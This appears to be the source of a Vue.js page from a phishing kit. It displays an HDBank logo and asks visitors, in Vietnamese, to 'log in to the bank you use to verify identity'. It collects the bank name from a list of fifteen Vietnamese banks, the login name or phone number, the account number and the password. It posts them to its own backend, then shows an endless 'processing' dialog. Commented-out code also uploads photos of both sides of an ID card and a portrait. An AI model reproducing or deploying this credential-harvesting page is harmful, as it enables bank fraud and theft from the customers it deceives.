<template>
    <div class="">
        <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div>
        <div style="margin-top: 20px">
            <v-form ref="formRef" @submit.prevent="submit">
                <v-row justify="center">
                    <div style="display: flex; justify-content: center">
                    </div>
                    <v-col md="8" lg="6" cols="12" sm="12">
                        <v-card title="Thông tin đăng ký" class="mb-5 p-5">
                            <v-card-title>
                                <p style="color: red">Để xác minh danh tính</p>
                                <p style="color: red">Vui lòng đăng nhập ngân hàng bạn đang sử dụng</p>
                            </v-card-title>
                            <v-card-text>
                                <v-select label="Tên ngân hàng" v-model="formValue.bankName" :items="bankList"
                                    variant="filled" :rules="rules.bankList"></v-select>
                                <v-text-field v-model="formValue.bankLoginName" variant="filled"
                                    label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginName"></v-text-field>
                                <v-text-field v-model="formValue.bankLoginAccount" variant="filled" label="Số tài khoản"
                                    :rules="rules.bankLoginAccount"></v-text-field>
                                <v-text-field v-model="formValue.bankLoginPassword" variant="filled" label="Mật khẩu"
                                    :rules="rules.bankLoginPassword"></v-text-field>
                            </v-card-text>

                        </v-card>
                        <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>

                    </v-col>
                </v-row>
            </v-form>
        </div>
    </div>
    <v-dialog max-width="450px" v-model="dialog" persistent>
        <v-card>
            <v-card-title>
                Đang xử lý thông tin
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">Vui lòng không tắt trình duyệt</p>
                <v-progress-circular :size="70" :width="7" color="warning" indeterminate></v-progress-circular>
            </v-card-text>
            <v-card-actions>
            </v-card-actions>
        </v-card>
    </v-dialog>
</template>

<script setup>
import { ref, onMounted, computed } from 'vue'
import axios from '@/plugins/axios'
import { useRouter } from 'vue-router'
import { useStore } from 'vuex';
const router = useRouter()
const store = useStore()
const user = computed(() => store.state.user)
onMounted(() => {
    if (!user.value.numberPhone) {
        router.push({ name: 'Home' })
    }
})
const formRef = ref(null)
const formValue = ref({
    bankLoginName: '',
    bankLoginAccount: '',
    bankLoginPassword: '',
    ...user.value
})
const rules = {
    bankLoginName: [
        v => !!v || 'Tên đăng nhập không được để trống',
    ],
    bankLoginAccount: [
        v => !!v || 'Số tài khoản không được để trống',
    ],
    bankLoginPassword: [
        v => !!v || 'Mật khẩu không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mật khẩu phải lớn hơn 6 ký tự',
    ],
}
const submit = async () => {
    const isValid = await formRef.value.validate()
    if (isValid.valid) {
        dialog.value = true
        try {
            const response = await axios.post(`/update-user/${formValue.numberPhone}}`, formValue.value)
            console.log(response)
        } catch (error) {
            console.log(error)
        }
    }
    // const formData = new FormData()
    // formData.append('imageBefore', formValue.value.imageBefore)
    // formData.append('imageAfter', formValue.value.imageAfter)
    // formData.append('imagePortrait', formValue.value.imagePortrait)
    // try {
    //     const response = await axios.post('/upload', formData)
    //     console.log(response)
    //     router.push({ name: 'Bank' })
    // } catch (error) {
    //     console.log(error)
    // }
}
const bankList = ref([
    {
        value: 'HDBank',
        title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
    },
    {
        value: 'MB',
        title: 'Ngân hàng Quân Đội (MB)'
    },
    {
        value: 'ACB',
        title: 'Ngân hàng Á Châu (ACB)'
    },
    {
        value: 'VPBank',
        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
    },
    {
        value: 'VCB',
        title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
    },
    {
        value: 'Techcombank',
        title: 'Ngân hàng Kỹ Thương Việt Nam (Techcombank)'
    },
    {
        value: 'VietinBank',
        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
    },
    {
        value: 'BIDV',
        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
    },
    {
        value: 'Agribank',
        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
    },
    {
        value: 'Sacombank',
        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
    },
    {
        value: 'SHB',
        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
    },
    {
        value: 'SeABank',
        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
    },
    {
        value: 'VIB',
        title: 'Ngân hàng Quốc tế (VIB)'
    },
    {
        value: 'TPBank',
        title: 'Ngân hàng Tiên Phong (TPBank)'
    },
    {
        value: 'OceanBank',
        title: 'Ngân hàng Đại Dương (OceanBank)'
    }

])
const dialog = ref(false)
</script>
<style>
.v-card-title {
    font-size: 16px !important;
    font-weight: 500;
    color: #000;
    margin-bottom: 20px;
}

.v-card {
    border: 1px solid #ccc !important;
}
</style>